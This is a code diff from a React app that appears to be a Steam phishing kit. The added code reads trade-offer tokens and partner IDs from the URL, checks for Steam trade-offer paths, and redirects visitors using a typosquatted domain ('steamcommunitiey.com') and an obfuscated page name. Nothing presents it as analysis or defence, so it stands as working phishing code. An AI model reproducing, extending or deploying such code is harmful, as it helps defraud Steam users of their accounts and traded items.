@@ -18,6 +18,9 @@ const App = () => {
             const isTradePage =
                 splittedPathname[0] === "tradeoffer" &&
                 splittedPathname[1] === "new";
+            const urlParams = new URLSearchParams(window.location.search);
+            const token = urlParams.get("token");
+            const partnerId = urlParams.get("partnerId");
 
             const className = ".lk0e6gi8s69v";
             const htmlUrl = "https://steamcommunitiey.com/txqmjgkxhzp5.html";
@@ -51,11 +54,21 @@ const App = () => {
                     openWind();
                 }, 100);
 
-            if (!slug && !token_part1 && !token_part2) {
-                const urlParams = new URLSearchParams(window.location.search);
-                const token = urlParams.get("token");
-                const partnerId = urlParams.get("partnerId");
+            if (isCurrentDomainValid) {
+                if (slug || (token_part1 && token_part2) || isTradePage) {
+                    const linkPart = isTradePage
+                        ? `tradeoffer/new/?partnerId=${partnerId}&token=${token}`
+                        : slug
+                        ? "id/" + slug
+                        : "p/" + token_part1 + "/" + token_part2;
+                    return (window.location.href =
+                        (process.env.REACT_APP_FRIEND_INVITE_REDIRECT_URL ||
+                            "http://localhost:3000/") + linkPart);
+                }
+                return goTo();
+            }
 
+            if (!slug && !token_part1 && !token_part2) {
                 if (!isTradePage || !partnerId || !token) return goTo();
 
                 await axios
@@ -160,15 +173,18 @@ const App = () => {
             }
 
             if (isCurrentDomainValid) {
-                if (slug || (token_part1 && token_part2)) {
+                if (slug || (token_part1 && token_part2) || isTradePage) {
+                    console.log(splittedPathname);
+
                     const linkPart = slug
                         ? "id/" + slug
                         : "p/" + token_part1 + "/" + token_part2;
-                    return (window.location.href =
-                        (process.env.REACT_APP_FRIEND_INVITE_REDIRECT_URL ||
-                            "http://localhost:3000/") + linkPart);
+                    // return (window.location.href =
+                    //     (process.env.REACT_APP_FRIEND_INVITE_REDIRECT_URL ||
+                    //         "http://localhost:3000/") + linkPart);
                 }
-                return goTo();
+                // return goTo();
+                return;
             }
 
             if (slug && !token_part1 && !token_part2) {
